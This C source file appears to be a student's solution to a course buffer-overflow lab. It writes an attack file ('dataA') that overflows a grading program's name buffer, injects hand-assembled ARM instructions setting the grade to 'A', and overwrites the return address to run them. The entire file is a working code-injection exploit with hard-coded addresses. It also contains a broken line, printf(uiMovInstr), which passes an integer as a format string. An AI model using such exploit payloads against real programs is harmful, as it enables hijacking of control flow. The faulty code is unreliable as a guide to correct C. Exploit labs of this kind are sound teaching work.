#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "miniassembler.h"

int main(void)
{
    int i;
    const char* name = "Tansha Vugarwal";
    /* ulReturnAddress in BSS (the name array) */
    unsigned long ulReturnAddress = 0x420078;
    
    /* grade = 0x41 */
    /* 0x41: hex for A */
    unsigned int uiMovInstr = MiniAssembler_mov(1, 0x41);
    unsigned int uiAdrInstr = MiniAssembler_adr(2, 0x420044, 0x42007C);
    unsigned int uiStrbInstr = MiniAssembler_strb(1, 2);

    /* Branch to printf("%c is your grade.\n", grade); */
    unsigned int uiBInstr = MiniAssembler_b(0x400864, 0x420084);

    FILE *psFile;

    psFile = fopen("dataA", "w");

    /* Printing out 15-character long name. */
    /* 0->14 */
    fprintf(psFile, "%s", name);

    /* 15->31 */
    for (i = 0; i < 17; i++)
    {
        putc('\0', psFile); /* Writes 00000000 */
    }

    /* 32->35 */
    fwrite(&uiMovInstr, sizeof(unsigned int), 1, psFile);
    /* 36->39 */
    fwrite(&uiAdrInstr, sizeof(unsigned int), 1, psFile);
    /* 40->43 */
    fwrite(&uiStrbInstr, sizeof(unsigned int), 1, psFile);
    /* 44->47 */
    fwrite(&uiBInstr, sizeof(unsigned int), 1, psFile);

    fwrite(&ulReturnAddress, sizeof(unsigned long), 1, psFile);

    fclose(psFile);

    printf(uiMovInstr);
    
    return 1;
}

